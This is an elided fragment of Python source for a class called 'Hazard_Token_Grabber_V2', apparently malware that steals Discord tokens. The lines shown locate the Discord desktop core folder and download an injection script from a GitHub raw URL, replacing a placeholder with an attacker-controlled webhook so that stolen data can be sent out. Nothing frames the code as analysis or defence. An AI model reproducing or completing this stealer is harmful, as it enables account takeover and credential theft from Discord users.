...
class Hazard_Token_Grabber_V2:
    def __init__(self):
        ...
        self.tempfolder = os.getenv("temp")+"\\Hoxton Nuker"
            ...
            for name in dirs:
                if "discord_desktop_core-" in name:
                    try:
                        ...
                        pass
                    f = requests.get("https://raw.githubusercontent.com/Virus2K2/static/master/Injection-clean.js").text.replace("%WEBHOOK_LINK%", self.webhook)
